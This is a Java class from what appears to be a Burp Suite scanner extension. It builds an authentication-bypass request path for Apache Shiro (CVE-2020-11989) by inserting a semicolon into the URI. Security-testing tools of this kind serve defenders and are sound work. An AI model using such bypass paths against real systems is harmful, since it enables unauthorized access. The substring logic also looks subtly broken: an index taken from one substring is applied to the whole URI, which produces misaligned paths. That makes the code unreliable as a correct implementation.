package burp.core.scanner.active.shiroscanner;

public class CVE_2020_11989 {
    public String requestURI;

    CVE_2020_11989(String requestURI){
        if (!requestURI.endsWith("/")) {
            int i = requestURI.indexOf("/");
            String a2 = requestURI.substring(i+1);
            int j = a2.indexOf("/");
            String a3 = requestURI.substring(j+1);
            String a4 = requestURI.substring(i,j+1);
            this.requestURI = a4+";"+a3;
        }else{
            this.requestURI = "/xxxxxxxxxxxxxxxxxxxxxx";
        }
    }

    public String getRequestURI() {
        return requestURI;
    }

    @Override
    public String toString() {
        return "CVE_2020_11989";
    }
}
